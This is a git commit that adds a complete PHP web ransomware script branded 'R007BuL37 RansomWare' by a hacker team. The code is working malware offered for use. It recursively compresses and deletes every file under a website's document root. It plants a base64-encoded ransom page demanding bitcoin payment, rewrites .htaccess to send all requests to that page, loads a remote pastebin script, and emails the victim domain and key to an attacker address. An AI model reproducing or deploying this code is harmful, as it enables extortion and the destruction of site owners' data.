0174629937d3f489d439ff611578746ddb90cdc7
R007BuL3T <95666293+R007BuL3T@users.noreply.github.com>
2024-07-30 17:38:46 +0600

    Add files via upload

---
+++ ransomware.php
@@ -0,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<link rel="icon" type="image/jpg" href="https://2.bp.blogspot.com/-bEUQdHdq0dw/XOa-2hbKvlI/AAAAAAAAALk/Wcn79SzJrkwXJJ3aMNsDrGa_pVE_RYpkwCLcBGAs/s1600/watch-dogs-2-hacker-smartphone.jpg">
+<head>
+	<meta name="theme-color" content="#1A1C1F">
+   <title>R007BuL37 RansomWare</title>
+<style type="text/css">
+body {
+    background: #1A1C1F;
+    color: #e2e2e2;
+}
+.inpute{
+    border:1px solid aqua;
+    background-color: transparent;
+    color: yellow;
+    width: 200px;
+    height: 20px;
+    text-align: center;
+}
+.selecte{
+    border-style: dotted;
+    border-color: yellow;
+    background-color: transparent;
+    width: 90px;
+    color: gold;
+}
+.submite{
+       background-color: black;
+	color: cyan;
+	border: 1.2px dotten gold;
+	width: 100px;
+}
+.result{
+  text-align: left;
+}
+</style>
+<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
+</head>
+<body>
+	<center>
+<pre>
+<center><h1>
+<font color="#56F307">_____   ___   ___ ______   ____        _      ____ ______
+ |  __ \ / _ \ / _ \____  | |  _ \      | |    |___ \____  |
+ | |__) | | | | | | |  / /  | |_) |_   _| |      __) |  / /
+ |  _  /| | | | | | | / /   |  _ <| | | | |     |__ <  / /
+ | | \ \| |_| | |_| |/ /    | |_) | |_| | |____ ___) |/ /
+ |_|  \_\\___/ \___//_/     |____/ \__,_|______|____//_/
+                              
+                                    
+                                         [ HEXolzWOLF Hacker Team ]                       
+<font color="white">Mail Function :</font><?php if(mail('bugtester2020@gmail.com','R007BuL37','R007BuL37')) { echo "<font color='aqua'>ON</font>"; } else { echo "<font color='red'>OFF</font>"; } ?>
+</font><br></pre>
+<div class="result">
+<?php
+error_reporting(0);
+set_time_limit(0);
+ini_set('memory_limit', '-1');
+if(isset($_POST['pass'])) {
+function encfile($filename){
+	if (strpos($filename, '.R007BuL37+HEXolzWOLF') !== false) {
+    return;
+	}
+	file_put_contents($filename.".R007BuL37+HEXolzWOLF", gzdeflate(file_get_contents($filename), 9));
+	unlink($filename);
+$file = base64_decode("PD9waHANZXJyb3JfcmVwb3J0aW5nKDApOw0kaW5wdXQgPSAkX1BPU1RbJ3Bhc3MnXTsNJHBhc3MgPSAia250bCI7DWlmKGlzc2V0KCRpbnB1dCkpIHsNaWYobWQ1KCRpbnB1dCkgPT0gJHBhc3MpIHsNZnVuY3Rpb24gZGVjZmlsZSgkZmlsZW5hbWUpew0JaWYgKHN0cnBvcygkZmlsZW5hbWUsICcuUjAwN0J1TDM3K0hFWG9seldPTEYnKSA9PT0gRkFMU0UpIHsNCXJldHVybjsNCX0NCSRkZWNyeXB0ZWQgPSBnemluZmxhdGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGVuYW1lKSk7DQlmaWxlX3B1dF9jb250ZW50cyhzdHJfcmVwbGFjZSgnLlIwMDdCdUwzNytIRVhvbHpXT0xGJywgJycsICRmaWxlbmFtZSksICRkZWNyeXB0ZWQpOw11bmxpbmsoJ0J1TDM3LnBocCcpOw0JdW5saW5rKCRmaWxlbmFtZSk7DQllY2hvICc8dGl0bGU+UjAwN0J1TDM3IFJhbnNvbVdhcmU8L3RpdGxlPjxib2R5IGJnY29sb3I9IzFBMUMxRj48aSBjbGFzcz0iZmEgZmEtdW5sb2NrIiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiA8Zm9udCBjb2xvcj0iI0ZGRUIzQiI+VW5sb2NrPC9mb250PiAoPGZvbnQgY29sb3I9IiM0MENFMDgiPlN1Y2Nlc3M8L2ZvbnQ+KSA8Zm9udCBjb2xvcj0iIzAwRkZGRiI+PT48L2ZvbnQ+IDxmb250IGNvbG9yPSIjMjE5NkYzIj4nLiRmaWxlbmFtZS4nPC9mb250PiA8YnI+JzsNfQ0NZnVuY3Rpb24gZGVjZGlyKCRkaXIpew0JJGZpbGVzID0gYXJyYXlfZGlmZihzY2FuZGlyKCRkaXIpLCBhcnJheSgnLicsICcuLicpKTsNCQlmb3JlYWNoKCRmaWxlcyBhcyAkZmlsZSkgew0JCQlpZihpc19kaXIoJGRpci4iLyIuJGZpbGUpKXsNCQkJCWRlY2RpcigkZGlyLiIvIi4kZmlsZSk7DQkJCX1lbHNlIHsNCQkJCWRlY2ZpbGUoJGRpci4iLyIuJGZpbGUpOw0JCX0NCX0NfQ0NZGVjZGlyKCRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10pOw1lY2hvICc8Zm9udCBjb2xvcj0ibGltZSI+PGJyPkRlY3J5cHRlZDxicj4nOw11bmxpbmsoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pOw1lY2hvICc8Zm9udCBjb2xvcj0ibGltZSI+c3VjZXNzICEhISc7DX0gZWxzZSB7DWVjaG8gJzx0aXRsZT5SMDA3QnVMMzcgUmFuc29tV2FyZTwvdGl0bGU+DTxtZXRhIG5hbWU9InRoZW1lLWNvbG9yIiBjb250ZW50PSIjY2MxMDE3Ij4NPGJvZHkgYmdjb2xvcj0jMUExQzFGPg08cHJlPg08Y2VudGVyPjxoMT4NPGZvbnQgY29sb3I9IiM1NkYzMDciPiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19fX18gICBfX18gICBfX18gX19fX19fICAgX19fXyAgICAgICAgXyAgICAgIF9fX18gX19fX19fCiB8ICBfXyBcIC8gXyBcIC8gXyBcX19fXyAgfCB8ICBfIFwgICAgICB8IHwgICAgfF9fXyBcX19fXyAgfAogfCB8X18pIHwgfCB8IHwgfCB8IHwgIC8gLyAgfCB8XykgfF8gICBffCB8ICAgICAgX18pIHwgIC8gLwogfCAgXyAgL3wgfCB8IHwgfCB8IHwgLyAvICAgfCAgXyA8fCB8IHwgfCB8ICAgICB8X18gPCAgLyAvCiB8IHwgXCBcfCB8X3wgfCB8X3wgfC8gLyAgICB8IHxfKSB8IHxffCB8IHxfX19fIF9fXykgfC8gLwogfF98ICBcX1xcX19fLyBcX19fLy9fLyAgICAgfF9fX18vIFxfXyxffF9fX19fX3xfX19fLy9fLwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbIEhFWG9seldPTEYgSGFja2VyIFRlYW0gXSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANPC9mb250Pjxicj4NPGk+DSAgICAgICAgICAgIDxmb250IGNvbG9yPSJyZWQiIHNpemU9IjIwIj5Xcm9uZyBQYXNzd29yZCAhISE8L2ZvbnQ+PC9pPg08L3ByZT4nOw19DWV4aXQoKTsNfQ0/Pg0JPCEtLS0tLS0tLS0tLS0gUmVDb2RlZCBCeSBSMDA3QnVMMzcgIHwNIEhFWG9seldPTEYgSGFja2VyIFRlYW0gLS0tLS0tLS0+IA08aHRtbD4NPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9d2luZG93cy0xMjUyIj4NPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiPg08bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iUjAwN0J1TDM3fCBIRVhvbHpXT0xGIj4NPG1ldGEgbmFtZT0ia2V5d29yZHMiIGNvbnRlbnQ9IkhFWG9seldPTEYsIFJhbnNvbXdhcmUsIFJhbnNvbXdlYiwgSGFja2VkLCBMb2NrZWQsIEVuY3J5cHRlZCwgUjAwN0J1TDM3Ij4gDTxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iUjAwN0J1TDM3Ij4NPG1ldGEgbmFtZT0icm9ib3RzIiBjb250ZW50PSJpbmRleCwgYWxsIj4NCTxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1JY2VsYW5kJyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz4NPGxpbmsgaHJlZj0naHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PU1lcmllbmRhJyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz4NPGxpbmsgaHJlZj0naHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVVidW50dScgcmVsPSdzdHlsZXNoZWV0JyB0eXBlPSd0ZXh0L2Nzcyc+DTxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1TaGFkb3dzK0ludG8rTGlnaHQnIHJlbD0nc3R5bGVzaGVldCcgdHlwZT0ndGV4dC9jc3MnPjxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UvcG5nIiBocmVmPSJodHRwczovLzIuYnAuYmxvZ3Nwb3QuY29tLy1iRVVRZEhkcTBkdy9YT2EtMmhiS3ZsSS9BQUFBQUFBQUFMay9XY243OVN6SnJrd1hKSjNhTU5zRHJHYV9wVkVfUllwa3dDTGNCR0FzL3MxNjAwL3dhdGNoLWRvZ3MtMi1oYWNrZXItc21hcnRwaG9uZS5qcGciLz48bGluayByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIiBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2ZvbnQtYXdlc29tZS80LjYuMy9jc3MvZm9udC1hd2Vzb21lLm1pbi5jc3MiPg08bWV0YSBwcm9wZXJ0eT0ib2c6aW1hZ2UiIGNvbnRlbnQ9Imh0dHBzOi8vMi5icC5ibG9nc3BvdC5jb20vLWJFVVFkSGRxMGR3L1hPYS0yaGJLdmxJL0FBQUFBQUFBQUxrL1djbjc5U3pKcmt3WEpKM2FNTnNEckdhX3BWRV9SWXBrd0NMY0JHQXMvczE2MDAvd2F0Y2gtZG9ncy0yLWhhY2tlci1zbWFydHBob25lLmpwZyI+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1NiTjRVVFFYIj48L3NjcmlwdD48bWV0YSBuYW1lPSd0aGVtZS1jb2xvcicgY29udGVudD0nIzAwMDAwMCc+DTxoZWFkPg08dGl0bGU+UjAwN0J1TDM3IFJhbnNvbVdhcmU8L3RpdGxlPjwvaGVhZD4NPHN0eWxlPg1ib2R5IHsNYmFja2dyb3VuZDogIzA5MTQwRTsNICAgYmFja2dyb3VuZC1pbWFnZTp1cmwoaHR0cHM6Ly8yLmJwLmJsb2dzcG90LmNvbS8tYkVVUWRIZHEwZHcvWE9hLTJoYkt2bEkvQUFBQUFBQUFBTGsvV2NuNzlTekpya3dYSkozYU1Oc0RyR2FfcFZFX1JZcGt3Q0xjQkdBcy9zMTYwMC93YXRjaC1kb2dzLTItaGFja2VyLXNtYXJ0cGhvbmUuanBnKTsgYmFja2dyb3VuZC1zaXplOmNvdmVyO30New0td2Via2l0LWJhY2tncm91bmQtc2l6ZTogMTAwJSAxMDAlOw0gICAtbW96LWJhY2tncm91bmQtc2l6ZTogMTAwJSAxMDAlOw0gICAtby1iYWNrZ3JvdW5kLXNpemU6IDEwMCUgMTAwJTsNICAgYmFja2dyb3VuZC1zaXplOiAxMDAlIDEwMCU7DX0NLm10ew0gICAgYm9yZGVyOjEuMnB4IHNvbGlkIGFxdWE7DSAgICBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsNICAgIGNvbG9yOiBsaW1lOw0gICAgd2lkdGg6IDIwMHB4Ow0gICAgaGVpZ2h0OiAyNXB4Ow0gICAgZm9udC1mYW1pbHk6IFVidW50dTsNICAgIHRleHQtYWxpZ246IGNlbnRlcjsNfQ0uYnRjYWRkcmVzc3sNICAgIGJvcmRlcjowLjhweCBzb2xpZCBncmV5Ow0gICAgYmFja2dyb3VuZC1jb2xvcjogIzFBMUMxRjsNICAgIGNvbG9yOiB5ZWxsb3c7DSAgICB0ZXh0LWFsaWduOiBjZW50ZXI7DSAgICB3aWR0aDogNDAwcHg7DSAgICBoZWlnaHQ6IDI2cHg7DSAgICBmb250LXNpemU6IDE3Ow0gICAgZm9udC1mYW1pbHk6IFVidW50dTsNfQ0uZW1haWx7DSAgICBib3JkZXI6MHB4Ow0gICAgYmFja2dyb3VuZC1jb2xvcjogdHJhbnNwYXJlbnQ7DSAgICB0ZXh0LWFsaWduOiBjZW50ZXI7IA0gICAgY29sb3I6IGFxdWE7DSAgICB3aWR0aDogMzEwcHg7DSAgICBoZWlnaHQ6IDMwcHg7DSAgICBmb250LXNpemU6IDI4LjU7DSAgICBmb250LWZhbWlseTogSWNlbGFuZDsNfQ1wbGFjZWhvbGRlcnsNCWNvbG9yOiB5ZWxsb3c7DX0NLmdhc3sNCWJhY2tncm91bmQtY29sb3I6IGJsYWNrOw0JY29sb3I6IGdvbGQ7DQlib3JkZXI6IDEuMnB4IHNvbGlkIGdvbGQ7DQl3aWR0aDogNzBweDsNfQ08L3N0eWxlPg08Y2VudGVyPjxicj48YnI+PGJyPjxicj48Zm9udD4NPHNwYW4gc3R5bGU9ImZvbnQ6IDQwcHggTWVyaWVuZGE7Y29sb3I6Ymx1ZTsiPllvdXIgV2Vic2l0ZSBIYXMgYmVlbiBFbmNyeXB0DTxociB3aWR0aD0iOTAlIj48c3BhbiBzdHlsZT0nZm9udDogMTBweCBpY2VsYW5kO2NvbG9yOndoaXRlO3RleHQtc2hhZG93OiAwcHggMHB4IDFweDsnPnwgUGF5bWVudCBBZGRyZXNzIHw8YnI+PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJidGNhZGRyZXNzIiB2YWx1ZT0icGF5bWVudHoiIHJlYWRvbmx5Pjxicj4NPHNwYW4gc3R5bGU9J2ZvbnQ6IDI1cHggaWNlbGFuZDtjb2xvcjpyZWQ7dGV4dC1zaGFkb3c6IDBweCAwcHggM3B4Oyc+TWFrZSBhIHBheW1lbnQgb3IgSSBkZXN0cm95IHlvdXIgd2Vic2l0ZSBhbmQgaXQgd2lsbCBub3QgcmV0dXJuIHRvIG5vcm1hbCwgYnkgbWFraW5nIGEgcGF5bWVudCBJIHdpbGwgZ2l2ZSB5b3UgYSBwYXNzd29yZCBhbmQgeW91ciB3ZWJzaXRlIHdpbGwgcmV0dXJuIHRvIG5vcm1hbCA6KSBIYWhhaGEganVzdCBmdW4gOykNPGJyPjxicj4NCTxzcGFuIHN0eWxlPSdmb250OiA5cHggaWNlbGFuZDtjb2xvcjp3aGl0ZTt0ZXh0LXNoYWRvdzogMHB4IDBweCAxcHg7Jz58fiBQYXNzd29yZCB+fA08Zm9ybSBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9InBvc3QiPg08aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icGFzcyIgY2xhc3M9Im10IiBwbGFjZWhvbGRlcj0iRW50ZXIgeW91ciBkZWNyeXB0aW9uIGtleSI+DTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJnYXMiIHZhbHVlPSJEZWNyeXB0Ij4NPC9mb3JtPg08YnI+PGJyPg08Ym9keSBiZ2NvbG9yPWJsYWNrPjx0ZCBhbGlnbj1jZW50ZXI+DTxzcGFuIHN0eWxlPSJmb250OiAxM3B4IHVidW50dTtjb2xvcjpnb2xkOyI+WyBIRVhvbHpXT0xGIEhhY2tlciBUZWFtIF0NPGhyIHdpZHRoPSI3MCUiIGNvbG9yPSJyZWQiPg0JPHNwYW4gc3R5bGU9J2ZvbnQ6IDguNXB4IEljZWxhbmQ7Y29sb3I6YXF1YTt0ZXh0LXNoYWRvdzogMHB4IDBweCAycHg7Jz48OjogQ29udGFjdCBNZSA6Oj4NPGJyPjxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZW1haWwiIHZhbHVlPSJidWd0ZXN0ZXIyMDIwQGdtYWlsLmNvbSIgcmVhZG9ubHk+PGJyPg08bWFycXVlZSBiZWhhdmlvcj0iYWx0ZXJuYXRlIiBzY3JvbGxhbW91bnQ9IjUwIiB3aWR0aD0iNDUwIj4gPGZvbnQgc2l6ZT0iNCIgY29sb3I9InNpbHZlciI+PGI+X19fX19fX19fX19fX19fX19fX188Zm9udCBzaXplPSI0IiBjb2xvcj0icmVkIj48Yj5fX19fX19fX19fX19fX19fX19fX19fXzxmb250IHNpemU9IjQiIGNvbG9yPSJzaWx2ZXIiPjxiPl9fX19fX19fX19fX19fX19fX19fPC9mb250PjwvbWFycXVlZT48YnI+DTwvaHRtbD4=");
+$q = str_replace('kntl', md5($_POST['pass']), $file);
+$w = str_replace('Bugtestermail', $_POST['email'], $q);
+$e = str_replace('paymentz', $_POST['btc'], $w);
+$r = str_replace('$3', '$'.$_POST['price'], $e);
+$dec = $r;
+$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
+$cok = fopen('index.php', 'w');
+fwrite($cok, $comp);
+fclose($cok);
+$hta = "#R007BuL37 | HEXolzWOLF Hacker Team\n
+DirectoryIndex BuL37.php\n
+ErrorDocument 403 /BuL37.php\n
+ErrorDocument 404 /BuL37.php\n
+ErrorDocument 500 /BuL37.php\n";
+$ht = fopen('.htaccess', 'w');
+fwrite($ht, $hta);
+fclose($ht);
+echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#FF0000">Locked</font> (<font color="#40CE08">Success</font>) <font color="#00FFFF">=></font> <font color="#2196F3">'.$filename.'</font> <br>';
+}
+
+function encdir($dir){
+	$files = array_diff(scandir($dir), array('.', '..'));
+		foreach($files as $file) {
+			if(is_dir($dir."/".$file)){
+				encdir($dir."/".$file);
+			} else {
+				encfile($dir."/".$file);
+				
+		}
+	}
+}
+
+if(isset($_POST['pass'])){
+	encdir($_SERVER['DOCUMENT_ROOT']);
+}
+copy('BuL37.php', $_SERVER['DOCUMENT_ROOT'].'/BuL37.php');
+$memec = $_POST['email'];
+$cyna = 'R007BuL37 | HEXolzWOLF Ransomware Info';
+$ngentot = "Domain : ".$_SERVER['SERVER_NAME'];
+$skuy = "Password : ".$_POST['pass'];
+$zegarr = "$ngentot \n $skuy";
+if(mail($memec,$cyna,$zegarr)) {
+echo '<font color="lime"><b>Password Saved, Check your Email</b></font>';
+} else {
+echo '<font color="red"><b>No Mail</b></font>';
+}
+exit();
+}
+?>
+	<pre>
+<h2><center><font color=gold>Encryption Key [~'-']~</h2></font></pre></center>
+<form action="" method="post" style=" text-align: center;">
+<font color="aqua">
+    <label>Key : </label>
+<input type="text" name="pass" class="inpute" placeholder="make a password">
+      <select name="method" class="selecte">
+         <option value="kontolbapakkau">Encrypt</option>
+      </select><pre><br>
+<label>Your Email : </label>
+<input type="text" name="email" class="inpute">
+<label>Your Payment Address : </label>
+<input type="text" name="btc" class="inpute">
+	<br>
+      <input type="submit" name="submit" class="submite" value="Submit" />
+</form>
+</div>
+</body>
+</html>
